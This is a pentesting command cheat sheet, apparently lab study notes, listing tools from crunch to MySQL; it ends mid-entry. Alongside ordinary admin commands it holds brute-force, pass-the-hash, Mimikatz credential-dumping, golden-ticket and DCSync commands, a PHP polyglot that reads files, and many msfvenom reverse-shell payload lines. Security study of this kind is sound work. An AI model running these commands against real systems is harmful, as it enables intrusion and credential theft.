- **Using Crunch to generate a non-repeating wordlist from multiple words and adding two characters from a defined character set:**:
  ```bash
  crunch 5 5 aADE -t ddd@@ -p dog cat bird
  ```
- **Combining Crunch mangling and piping it to aircrack-ng:**:
  ```bash
  crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
  ```
---

### curl
- **Make a GET Request**:
  ```bash
  curl http://<url>
  ```

- **Download a File**:
  ```bash
  curl -O <url>
  ```

- **Send POST Request with Data**:
  ```bash
  curl -X POST -d "username=<username>&password=<password>" http://<url>
  ```
- **Uploading a File Using curl with a Form Field**:
  ```bash
  curl -F myFile=@test.jpg http://192.168.208.183/exiftest.php
  ```

- **Using curl with a Proxy Server**:
  ```bash
  curl "http://127.0.0.1:8080/shell.php?cmd=whoami" --proxy 192.168.120.223:3128
  ```

---

### cut
- **Cut Specific Field from Text**:
  ```bash
  cut -d '<delimiter>' -f <field-number> <file>
  ```

- **Cut from Character Range**:
  ```bash
  cut -c <range> <file>
  ```
- **Extracting the First Field of /etc/passwd Using cut**:
  ```bash
  cut -d ":" -f 1 /etc/passwd
  ```

- **Extracting the Second Field from a Comma-Separated String**:
  ```bash
  echo "I hack binaries,web apps,mobile apps and just about anything else" | cut -f 2 -d ","
  ```
---

### debugfs
- **View Files in Ext2/Ext3 Filesystem**:
  ```bash
  debugfs <device>
  ```

- **Dump File Contents**:
  ```bash
  debugfs -R 'cat <file-path>' <device>
  ```
- **Using debugfs to Read Files on a Partition**:
  ```bash
  debugfs /dev/sda5
  debugfs:  cd /root/.ssh
  debugfs:  cat id_rsa
  ```
---

### diff
- **Compare Two Files**:
  ```bash
  diff <file1> <file2>
  diff -c <file1> <file2>
  ```
  Vimdiff can also be used to compare files: vimdiff <file1> <file2>
- **Show Side-by-Side Difference**:
  ```bash
  diff -y <file1> <file2>
  ```

---

### dig
- **Query DNS for a Domain**:
  ```bash
  dig <domain>
  ```

- **Query DNS for a Specific Record Type**:
  ```bash
  dig <domain> <record-type>
  ```
- **Using dig to Query MX (Mail Exchange) Records for a Domain**:
  ```bash
  dig -t mx kali.org
  ```

- **Using dig with a Specific DNS Server to Query a Domain**:
  ```bash
  dig @8.8.8.8 kali.org
  ```
- **Performing a Zone Transfer (AXFR) with dig**:
  ```bash
  dig axfr @<DNS_server> kali.org
  dig axfr @ns1.example.com example.com
  ```

---

### dir
- **List Files in Directory**:
  ```bash
  dir <directory-path>
  ```

- **List All Files with Details**:
  ```bash
  dir /s <directory-path>
  ```
- **Using dir to Locate Specific Files by Name (Recursive Search)**:
  ```bash
  dir /s trojan.txt
  ```
- **Using dir to Locate All .exe Files with Pagination**:
  ```bash
  dir /s *.exe /p
  ```
- **Using dir to View Alternate Data Streams (ADS)**:
  ```bash
  dir /r
  ```

---

### dirb
- **Directory Bruteforce Scan**:
  ```bash
  dirb http://<url> <wordlist>
  ```

- **Set Proxy for Directory Scan**:
  ```bash
  dirb http://<url> <wordlist> -p <proxy>
  ```
- ** Using dirb to Perform a Non-Recursive Scan with a Delay Between Requests**:
  ```bash
  dirb http://www.megacorpone.com -r -z 10
  ```

---

### dnsrecon
- **Perform DNS Enumeration**:
  ```bash
  dnsrecon -d <domain>
  ```

- **Perform Reverse DNS Lookup**:
  ```bash
  dnsrecon -r <ip-range>
  ```
- **Using dnsrecon to Perform a Zone Transfer (AXFR)**:
  ```bash
  dnsrecon -d megacorpone.com -t axfr
  ```

- **Brute Forcing Hostnames Using dnsrecon**:
  ```bash
  dnsrecon -d megacorpone.com -D ~/list.txt -t brt
  ```
---

### docker
- **List Running Containers**:
  ```bash
  docker ps
  docker container ls
  ```

- **Run a Container**:
  ```bash
  docker run -it <image-name>
  ```

- **Build Docker Image from Dockerfile**:
  ```bash
  docker build -t <image-name> .
  ```
- **Docker Help Commands**:
  ```bash
  docker --help
  docker container run --help
  ```

- **Starting a Container with an Interactive Shell**:
  ```bash
  docker container run --interactive --tty --rm centos:7 /bin/bash
  ```

- **Mapping Ports (Host to Container)**:
  ```bash
  docker container run -d --rm -p 8080:80 httpd
  curl localhost:8080
  ```
- **Executing a shell in a running container (e.g., container ID 899):**:
  ```bash
  docker exec -it 899 /bin/bash
  ```

- **Stop a running container:**:
  ```bash
  docker container stop 899
  ```

- **Mounting a Host Directory to a Container**:
  ```bash
  docker container run -d --rm -p 8080:80 -v /home/student/webroot/:/usr/local/apache2/htdocs/ httpd
  curl localhost:8080
  ```
- **Starting a Container with Host Networking**:
  ```bash
  docker container run -d --rm --network host -v /home/student/webroot/:/usr/local/apache2/htdocs/ httpd
  curl localhost
  ```

---

### evil-winrm
- **Start Evil-WinRM Session/Logging Into a WinRM Session**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password>
  ./evil-winrm.rb -i 192.168.50.80 -u tester -p password
  ```

- **Execute Command on Target Machine:**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
  ```
- **Accessing Home Directory with PowerShell Scripts**:
  ```bash
  evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
  ```
  The -s . argument specifies that the PowerShell scripts in the user's home directory should be accessed.

- **Pass-the-Hash (PTH) Authentication**:
  ```bash
  evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
  evil-winrm -u tester -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.205.59
  ```
- **Post-Enumeration with Active Directory Module**:
  ```bash
  *Evil-WinRM* PS C:\Users\tester\Desktop> Import-Module ActiveDirectory
  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADPrincipalGroupMembership svc_apache$ | select name
  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADPrincipalGroupMembership enox | select name
  ```

- **Inspecting Group Managed Service Accounts (gMSA)**:
  ```bash
  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
  ```
- **Retrieving a Password hash**:
  ```bash
  *Evil-WinRM* PS C:\Users\tester\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
  *Evil-WinRM* PS C:\Users\tester\Desktop> $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
  *Evil-WinRM* PS C:\Users\tester\Desktop> $mp = $gmsa.'msDS-ManagedPassword'
  *Evil-WinRM* PS C:\Users\tester\Desktop> $mp
  ```

- **Execute Command on Target Machine**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
  ```
- **Start Evil-WinRM Session**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password>
  ```

- **Execute Command on Target Machine**:
  ```bash
  evil-winrm -i <target-ip> -u <username> -p <password> -c "<command>"
  ```

---

### exiftool
- **View Metadata of a File**:
  ```bash
  exiftool <file>
  ```

- **Extract Specific Metadata Field**:
  ```bash
  exiftool -<field-name> <file>
  ```
- **Using exiftool to Embed a PHP Payload in an Image (Polyglot File)**:
  ```bash
  exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/user/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
  ```

---

### ffuf
- **Directory Bruteforce Scan**:
  ```bash
  ffuf -w <wordlist> -u http://<url>/FUZZ
  ```

- **Find Hidden DNS Subdomains**:
  ```bash
  ffuf -w <subdomain-wordlist> -u <domain>/FUZZ
  ```
- **Basic directory fuzzing using status code 200**:
  ```bash
  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.229/FUZZ -mc 200
  ```

- **Using RAFT wordlist with colored output and SSL ignoring**:
  ```bash
  ffuf -k -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "http://flower.pg/FUZZ"
  ```
- **Fuzzing URL Parameters**:
  ```bash
  ffuf -c -r -u 'http://192.168.124.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0
  ```

- **Fuzzing Subdomains**:
  ```bash
  ffuf -k -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flower.pg/" -H "Host: FUZZ.flower.pg" -fw 105
  ```
- **Recursive Fuzzing**:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
  ```

- **POST Parameter Fuzzing**:
  ```bash
  ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
  ```
- **Additional Useful Options**:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -rate 500 -timeout 5
  ```

- **Find Hidden DNS Subdomains**:
  ```bash
  ffuf -w <subdomain-wordlist> -u <domain>/FUZZ
  ```

---

### find
- **Search for Files by Name (linux)**:
  ```bash
  find /path/to/search -name "<file-name>"
  ```

- **Search Files by Permission (linux)**:
  ```bash
  find /path/to/search -perm <permission>
  ```
- **Using find to Search for a Keyword in a Specific File (Windows)**:
  ```bash
  find "password" C:\Users\Offsec\importantfile.txt
  ```

- **Using type to Display File Contents and then Search with find (Windows)**:
  ```bash
  type importantfile.txt | find "password"
  ```
- **Using dir to List Files and Search for a Keyword in Directory Names (Windows)**:
  ```bash
  dir | find "important"
  ```

---

### findstr
- **Search for String in Files (Windows)**:
  ```bash
  findstr "<string>" <file>
  ```

- **Search in Files Recursively (Windows)**:
  ```bash
  findstr /s "<string>" <directory-path>\*.*
  ```
- **Using findstr to Search for Multiple Strings in a File (Windows)**:
  ```bash
  findstr "Johnny password" importantfile.txt
  ```

- **Using findstr with Case-Insensitive Search for "password"**:
  ```bash
  findstr /si "password"
  ```

---

### foremost
- **Recover Deleted Files**:
  ```bash
  foremost -i <image-file> -o <output-dir>
  ```

- **Use Specific File Types for Recovery**:
  ```bash
  foremost -t <file-types> -i <image-file> -o <output-dir>
  ```
- **Using foremost to Recover PDF Files from a Disk Image (Linux**:
  ```bash
  sudo foremost -v -q -t pdf -i /dev/sda1 -o ./Recovery
  ```

---

### gcc
- **Compile a C Program**:
  ```bash
  gcc -o <output-file> <source-file.c>
  ```

- **Compile with Debugging Symbols**:
  ```bash
  gcc -g -o <output-file> <source-file.c>
  ```
- **Installing GCC for Multilib Support (64-bit and 32-bit compilation)**:
  ```bash
  sudo apt-get install gcc-multilib
  ```

- **Installing Mingw-w64 (Cross-Compiler for Windows)**:
  ```bash
  apt-get install mingw-w64 -y
  ```

---

### git
- **Clone a Repository**:
  ```bash
  git clone <repository-url>
  ```
---
- **Check Git Version**:
  ```bash
  git --version
  ```
- ** Accessing Git Help*:
  ```bash
  git help
  git help git
  git help commit
  git help init
  git help config
  ```
---
- **Configuring User Settings**:
  ```bash
  git config --local user.email "hacker@git.com"
  git config --local user.name "Leet Hacker"
  
  ```
- **Confirm User Configuration**:
  ```bash
  cat config
  git config --list
  ```
---
- **Check the Status of a Git Repository**:
  ```bash
  git status
  ```
- **adding and commiting changes the Status of a Git Repository**:
  ```bash
  git add .
  git commit -m "First commit"
  ```
- **Viewing Commit Logs**:
  ```bash
  git log
  git log --pretty=oneline
  git log --stat
  git log -p -1
  ```
- **Git Diff: Comparing Changes Between Commits**:
  ```bash
  git diff 4e5a690fb542e77598c46c7d58f614238fd35a5c 8ad4afea2376ca2eeb9ffb3ff293c5456e3708c9
  git diff 4e5a690 8ad4af
  ```
### GPG
- **Encrypt a File**:
  ```bash
  gpg -c <file>
  ```
- **Encrypt the file using Blowfish symmetric-key encryption**:
  ```bash
  gpg -c --cipher-algo blowfish <file>
  ```

- **Decrypt a File**:
  ```bash
  gpg <file>.gpg
  gpg --decrypt <file>.gpg
  ```

- **Generate a GPG Key Pair**:
  ```bash
  gpg --gen-key
  ```
---
### Hashcat
- **Installing hashcat-utils & Start Hashcat with a Wordlist**:
  ```bash
  sudo apt install hashcat-utils
  hashcat -m <hash_type> <hash_file> <wordlist>
  ```

- **Show Supported Hash Types**:
  ```bash
  hashcat --help | grep Hash
  ```

- **Resume a Session**:
  ```bash
  hashcat --session <session_name> --restore
  ```
- **Displaying properties of a Skylake CPU with hashcat:**:
  ```bash
  hashcat -I
  ```

- **Benchmarking the Skylake CPU with hashcat:**:
  ```bash
  hashcat --help
  hashcat -b -m 2500
  ```
- **Converting a PCAP file to a .hccapx file for hashcat and Cracking it**:
  ```bash
  /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
  hashcat -m 2500 output.hccapx /usr/share/john/password.lst
  ```
  The -m 2500 flag specifies the hash type (WPA/WPA2)
- **Bruteforce JWT secret key**:
  ```bash
  hashcat -a 0 -m 16500 <JWT-token> JWT-Commom-Secrets
  ```

---
### Host
- **Lookup an IP Address for a Hostname**:
  ```bash
  host <hostname>
  ```

- **Reverse Lookup an IP**:
  ```bash
  host <IP_address>
  ```
- **Lookup an IP Address for a Hostname**:
  ```bash
  host <hostname>
  host www.megacorpone.com
  ```

- **Querying MX and TXT Records**:
  ```bash
  host -t mx megacorpone.com
  host -t txt megacorpone.com
  ```
- **Brute Forcing Forward DNS Name Lookups**:
  ```bash
  for ip in $(cat list.txt); do host $ip.megacorpone.com; done
  ```

- **Brute Forcing Reverse DNS Names**:
  ```bash
  for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
  ```
- **Perform a DNS zone transfer**:
  ```bash
  host -l <domain name> <dns server address>
  host -l megacorpone.com ns2.megacorpone.com
  ```
- **Retrieving DNS Servers for a Domain**:
  ```bash
  host -t ns megacorpone.com | cut -d " " -f 4
  ```
---
### HTTPTunnel
- **Installing HTTPTunnel from the Kali Linux repositories**:
  ```bash
  apt-cache search httptunnel
  sudo apt install httptunnel
  ```

- **Start an HTTP Tunnel Server**:
  ```bash
  httptunnel -s <server_port>
  ```
- **Create an HTTP Tunnel Client**:
  ```bash
  httptunnel -c <client_port> <server_host>:<server_port>
  ```

- ** Forwarding TCP Port 8888 on the Linux Machine to TCP Port 3389 on the Windows Server 2016 System
# Setting up the server component of HTTPTunnel: Setting up the server and the client component of HTTPTunnel**:
  ```bash
  ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
  hts --forward-port localhost:8888 1234        # the server component of HTTPTunnel
  htc --forward-port 8080 10.11.0.128:1234       # the client component of HTTPTunnel
  ```
  - **Create an HTTP Tunnel Client**:
  ```bash
  httptunnel -c <client_port> <server_host>:<server_port>
  ```
---
### Hydra
- **Brute Force SSH Login**:
  ```bash
  hydra -l <username> -P <password_list> ssh://<target_ip>
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
  ```

- **Brute Force HTTP Basic Authentication**:
  ```bash
  hydra -L <user_list> -P <password_list> http-get://<target_ip>
  ```
- **Retrieve Information About http-form-post Module**:
  ```bash
  hydra http-form-post -U
  ```

- **Web Form Bruteforce Attack**:
  ```bash
    hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
    hydra 10.11.0.22 http-form-post "/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P passwords.txt
  ```
- **Brute-Forcing FTP with Limited Tasks**:
  ```bash
  hydra -l <username> -P <password_list> ftp://<target_ip> -t <number>
  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.217.52 -t 3
  ```

- ** FTP Bruteforce Using Colon-Separated "login:pass" Format**:
  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.208.183
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp
  ```
---
### ICACLS
- **Display File Permissions**:
  ```cmd
  icacls <file/folder>
  ```
- **Using icacls on the Music directory**:
  ```cmd
  icacls Music
  ```
- **Using icacls to grant permissions**:
  ```cmd
  icacls Music /grant Susan:(OI)(CI)(F)
  ```
- **Using icacls to check and propagate permissions recursively**:
  ```cmd
  icacls Music /t /c
  ```
- **Grant Permissions**:
  ```cmd
  icacls <file> /grant <user>:(<permissions>)
  ```

- **Remove All Permissions**:
  ```cmd
  icacls <file> /remove <user>
  ```
---
### Iconv
- **Convert File Encoding**:
  ```bash
  iconv -f <source_encoding> -t <target_encoding> <input_file> -o <output_file>
  ```

- **Convert the file test.txt from ASCII to UTF-8 encoding and save it as test2.txt**:
  ```bash
  iconv -f ASCII -t UTF-8 test.txt -o test2.txt
  ```
- **Check Supported Encodings**:
  ```bash
  iconv --list
  ```
---
### Impacket
- **Run SMB Server**:
  ```bash
  impacket-smbserver <share_name> <share_path>
  /usr/bin/impacket-smbserver tmpname /tmp/ -smb2support
  /usr/bin/impacket-smbserver tmpname $(pwd) -smb2support
  ```

- **Execute Remote Command**:
  ```bash
  impacket-psexec <target_ip> -u <username> -p <password> <command>
  impacket-psexec username:password@127.0.0.1
  impacket-psexec -hashes aad3b435b514ddddd35b51404ee:d4bf5a8dddddd5b8dbb60859746 tester@10.11.1.73
  ```
- **Dumping Domain User Hashes from ntds.dit**:
  ```bash
  impacket-secretsdump -ntds "Active Directory/ntds.dit" -system registry/SYSTEM LOCAL
  ```

- **MSSQLClient for SQL Exploitation**:
  ```bash
  /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:password@10.129.255.88 -windows-auth
  ```
- **Run SMB Server**:
  ```bash
  impacket-smbserver <share_name> <share_path>
  ```

- **Execute Remote Command**:
  ```bash
  impacket-psexec <target_ip> -u <username> -p <password> <command>
  ```
---
### IP
- **Show IP Address of Interfaces**:
  ```bash
  ip addr
  ```

- **Add a New IP Address**:
  ```bash
  ip addr add <IP_address>/<CIDR> dev <interface>
  ```

- **Delete an IP Address**:
  ```bash
  ip addr del <IP_address>/<CIDR> dev <interface>
  ```
- **Adding a route to the network 10.13.37.0/24 via the eth1 interface**:
  ```bash
  ip route add 10.13.37.0/24 dev eth1
  ```
---
### IPTables
- **List Rules**:
  ```bash
  iptables -L
  sudo iptables -vn -L
  ```

- **Add a Rule to Accept Traffic on a Port**:
  ```bash
  iptables -A INPUT -p tcp --dport <port> -j ACCEPT
  ```

- **Block an IP Address**:
  ```bash
  iptables -A INPUT -s <IP_address> -j DROP
  ```
- **Setting Default Forward Policy to Drop: **:
  ```bash
  sudo iptables -P FORWARD DROP
  ```
  This drops all traffic through the forward chain unless explicitly allowed by specific rules.
- **Adding Rules to Accept or Block Traffic**:
  ```bash
  sudo iptables -s 192.168.1.0/24 -p all -A INPUT
  ```
  This allows all types of traffic (-p all) from the subnet 192.168.1.0/24 to the INPUT chain.
- **Allowing traffic from the local machine:**:
  ```bash
  sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT
  ```
  This rule only allows traffic between the local machine (localhost) and itself.

- **Allowing traffic from a specific IP address (e.g., 192.168.1.37):**:
  ```bash
  sudo iptables -s 192.168.1.37 -p tcp -A INPUT
  ```
- **Show Rules with Line Numbers**:
  ```bash
  sudo iptables -L --line-numbers
  ```
- **Inserting Rules at Specific Line Numbers:**:
  ```bash
  sudo iptables -s 192.168.1.37 -I INPUT 1
  ```
- **Inserting a rule based on connection state (for established connections):**:
  ```bash
  sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
  ```
- **Inserting a rule to block invalid packets:**:
  ```bash
  sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
  ```
- **Rule Replacement and Removal:**:
  ```bash
  sudo iptables -R INPUT 2 -s 192.168.1.0/24 -j DROP
  ```
  This replaces the second rule in the INPUT chain to drop traffic from the 192.168.1.0/24 subnet.
- **Reset Packet and Byte Counters:**:
  ```bash
  sudo iptables -Z
  ```
- **Configuring Rules for Nmap Scans:**:
  ```bash
  sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
  sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT
  ```
  Allowing incoming and outgoing traffic from the Nmap scanner

---
### John
- **Run John the Ripper on a Password File**:
  ```bash
  john <password_file>
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
  ```

- **Show Cracked Passwords**:
  ```bash
  john --show <password_file>
  ```
- **Creating mutation rule in John the Ripper configuration file**:
  ```bash
  sudo nano /etc/john/john.conf
  nano> ([List.Rules:Wordlist])
  nano> $[0-9]$[0-9]
  john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
  ```
- **Cracking using password mutation rules**:
  ```bash
  john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
  ```
- **Cracking /etc/shadow File**:
  ```bash
  unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
  john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
  
  ```
- **Cracking WordPress (WP) Password Hash**:
  ```bash
  echo '$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/' > pass.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
  
  ```
- **Cracking GPG Private Key**:
  ```bash
  gpg2john creds.priv > creds4john
  john creds4john --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- **Cracking JSON Web Token (JWT) Secret Key**:
  ```bash
  john jwt.txt --wordlist=rockyou.txt
  ```
- **Cracking Windows Password Hashes**:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT
  ```
- **Searching for Passwords in John the Ripper Wordlist**:
  ```bash
  grep -i password /usr/share/john/password.lst
  ```

---
### Kerberoast
- **Installing Kerberoast**:
  ```bash
  sudo apt update && sudo apt install kerberoast
  ```

- **Request a Service Ticket**:
  ```bash
  GetUserSPNs.py -request -dc-ip <domain_controller_ip> <domain>/<username>
  ```

- **Extract Service Tickets**:
  ```bash
  python kerberoast.py -t <ticket_file>
  ```
---
### LN
- **Create a Symbolic Link**:
  ```bash
  ln -s <target_file> <link_name>
  ```

- **Create a Hard Link**:
  ```bash
  ln <target_file> <link_name>
  ```
---
### LS
- **List Files in a Directory**:
  ```bash
  ls
  ```
- **Show Detailed Information**:
  ```bash
  ls -l
  ```

- **Show Hidden Files**:
  ```bash
  ls -a
  ```
- **List files in the current directory and sort them alphabetically**:
  ```bash
  ls | sort
  ```
- **List all files (including hidden files) with detailed information, sorted by modification time, in human-readable format**:
  ```bash
  ls -laht
  ```

- **List files and directories sorted by modification time (showing only the most recent file)**:
  ```bash
  ls -l --sort=time
  ```
---
### Man
- **View Manual Page of a Command**:
  ```bash
  man <command>
  man passwd
  ```

- **Search for a Keyword in Manuals**:
  ```bash
  man -k <keyword>
  man -k passwd
  ```
- ** Search the manual pages for exactly the word 'passwd' (as a whole word)**:
  ```bash
  man -k '^passwd$'
  ```

- **Display the manual for the configuration file for 'passwd'**:
  ```bash
  man 5 passwd
  ```
---
### Masscan
- **Scan an IP Range for Open Ports**:
  ```bash
  masscan <IP_range> -p<ports>
  ```

- **Set Maximum Rate**:
  ```bash
  masscan <IP_range> -p<ports> --rate=<rate>
  ```
- **Scan  for web servers (port 80) across an entire Class A subnet**:
  ```bash
  sudo masscan -p80 10.0.0.0/8
  ```

- **Using Masscan with advanced options to scan a smaller subnet**:
  ```bash
  sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
  ```
  rate=1000: Limit the scan to send 1000 packets per second to avoid overloading the network
---
### Medusa
- **Run Medusa without specific targets for a basic usage example**:
  ```bash
  medusa -d
  ```

- **Perform a brute-force attack against a web service on the target IP**:
  ```bash
  medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
  ```
- **Brute Force Login for FTP**:
  ```bash
  medusa -h <host> -u <username> -P <password_list> -M ftp
  ```

- **Set Number of Parallel Connections**:
  ```bash
  medusa -h <host> -u <username> -P <password_list> -M ftp -t <threads>
  ```
---
### Mimikatz
- **Dump User Credentials**:
  ```cmd
  mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
  ```

- **Export Credentials to a File**:
  ```cmd
  mimikatz "privilege::debug" "sekurlsa::logonpasswords" > credentials.txt
  ```
- **Running Mimikatz and elevate privileges:**:
  ```cmd
  mimikatz # privilege::debug
  mimikatz # token::elevate
  ```

- **Extracting Kerberos tickets:**:
  ```cmd
  mimikatz # sekurlsa::tickets
  ```
- **Dumping Local SAM Database**:
  ```cmd
  mimikatz # lsadump::sam
  ```

- **Overpass-the-Hash (Pass-the-Hash)**:
  ```cmd
  mimikatz # sekurlsa::pth /user:tester /domain:test.com /ntlm:e2b4dasdfe0d87aa966c327 /run:PowerShell.exe
  ```
- **Pass-the-Ticket (Golden & Silver Tickets)**:
  ```cmd
  mimikatz # kerberos::purge
  mimikatz # kerberos::list
  
  ```

- **Golden Ticket Attack- Creating a Golden Ticket for a domain:**:
  ```cmd
  mimikatz # kerberos::golden /user:tester /domain:test.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:test.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327
  ```
- **Performing a DCSync attack to dump domain password hashes for users**:
  ```cmd
  mimikatz # lsadump::dcsync /user:Administrator
  ```

---  
### MinGW-64
- **Install the mingw-w64 cross-compiler in Kali Linux for building Windows binaries**:
  ```bash
  sudo apt install mingw-w64
  ```

- **Compile with Debug Symbols**:
  ```bash
  x86_64-w64-mingw32-gcc -g <source_file>.c -o <output_file>.exe
  ```
- **Compile a C Program**:
  ```bash
  x86_64-w64-mingw32-gcc <source_file>.c -o <output_file>.exe
  ```

- **Compile a code for Windows (32-bit) by linking the Winsock library (ws2_32)**:
  ```bash
  i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
  ```
---
### Mklink
- **Create a Symbolic Link**:
  ```cmd
  mklink <link_name> <target_path>
  mklink softlink fileToBeLinkedTo.txt
  ```

- **Create a Hard Link**:
  ```cmd
  mklink /H <link_name> <target_path>
  mklink /h hardlink secondFile.txt
  ```

- **Create a Directory Junction**:
  ```cmd
  mklink /J <junction_name> <target_path>
  ```
---
### Mosquitto_sub
- **Subscribe to a Topic**:
  ```bash
  mosquitto_sub -h <broker_address> -t <topic>
  ```

- **Subscribe with Authentication**:
  ```bash
  mosquitto_sub -h <broker_address> -u <username> -P <password> -t <topic>
  ```
- **Subscribe to the MQTT broker at 172.16.201.50 to retrieve messages from the 'important' topic**:
  ```bash
  mosquitto_sub -h 172.16.201.50 -u tester -P password -t important
  ```
---
### Mount
- **Mount a Filesystem: Mount a filesystem of type ext4**:
  ```bash
  mount <device> <mount_point>
  mount -t ext4 /dev/sdb1 /mnt/usb
  ```

- **Unmount a Filesystem**:
  ```bash
  umount <mount_point>
  sudo umount /mnt/usb
  ```

- **List Mounted Filesystems**:
  ```bash
  mount
  ```
- **Mount a network share (NFS) with the "nolock" option**:
  ```bash
  sudo mount -o nolock 10.11.1.72:/home ~/home/
  ```
  Disables file locking for NFS mounts, useful if the NFS server doesn't support or use locks.
---
### Msfvenom
- **Generate a basic Reverse Shell Payload**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > payload.exe
  ```

- **List Available Payloads: List payload options**:
  ```bash
  msfvenom -l payloads
  msfvenom -p linux/x86/shell_reverse_tcp --list-options
  ```
- **Exporting the payload as an ELF binary**:
  ```bash
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf
  ```

- **Embeding the payload into an existing binary (plink.exe):**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
  ```
- **Generate a Windows Meterpreter reverse shell**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
  ```

- **Generate Windows reverse shell payload with bad character filtering and encoding**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
  ```
- **Buffer Overflow (BOF) Payload Example**:
  ```bash
  msfvenom -a x86 --platform Windows -p windows/exec CMD="cmd.exe" -f hex -b "\x00\x0a\x0d\x25\x26\x2b\x3d" > exploit3.txt
  ```
- **Generate HTA and PowerShell Payloads**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
  ```
- **Generate a PowerShell-compatible payload:**:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
  ```
- **Generate an ASP payload for IIS servers:**:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=443 -f asp -o evil.asp
  ```
- **Create a WAR (Web Application Archive) payload for Apache Tomcat:**:
  ```bash
  msfvenom -p java/shell_reverse_tcp LHOST=192.168.119.171 LPORT=443 -f war -o sh.war
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.99 LPORT=5566 -f raw -o shell.war
  ```
- **Generating SMBGhost Exploit Payload**:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
  ```
---
### MySQL
- **Log in to MySQL**:
  ```bash
  mysql -u <username> -p
  ```

- **Execute an SQL Script**:
  ```bash
  mysql -u <username> -p <database> < script.sql
